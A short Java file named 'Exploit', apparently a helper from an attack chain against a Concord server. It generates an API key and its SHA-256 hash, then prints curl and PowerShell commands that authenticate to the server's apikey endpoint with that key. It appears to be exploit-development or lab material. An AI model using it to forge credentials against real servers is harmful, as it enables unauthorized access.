import java.security.SecureRandom;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.Base64;
import java.util.Base64.Encoder;
public class Exploit {
  public static String generateSecureRandom() {
       // create instance of SecureRandom class
       SecureRandom rnd = new SecureRandom();
       byte[] ab = new byte[16];
       rnd.nextBytes(ab);

       Encoder e = Base64.getEncoder().withoutPadding();
       String s =  e.encodeToString(ab);

       return s;
  }
  public static String generateAPIKeyHash(String secureRandom) {
       MessageDigest md;
       try {
           md = MessageDigest.getInstance("SHA-256");
       } catch (NoSuchAlgorithmException ex) {
           throw new RuntimeException(ex);
       }

       byte[] hash = Base64.getDecoder().decode(secureRandom);
       hash = md.digest(hash);
       String api_key = Base64.getEncoder().withoutPadding().encodeToString(hash);
       return api_key;
  }
  public static void main(String args[]) {
    String apiKey = generateSecureRandom();
    String apiKeyHash = generateAPIKeyHash(apiKey);
    System.out.println(String.format("(+) APIKey: %s", apiKey));
    System.out.println(String.format("(+) API Key Sha256 Hash: %s", apiKeyHash));
    System.out.println(String.format("(+) Powershell: iwr -Uri 'http://concord:8001/api/v1/apikey' -Headers @{ Authorization = \"%s\";ContentType= \"application/json\"}", apiKey));
    System.out.println(String.format("(+) Bash: curl -H \"authorization: %s\" -H \"Content-Type: application/json\"  http://concord:8001/api/v1/apikey", apiKey));

  }
}
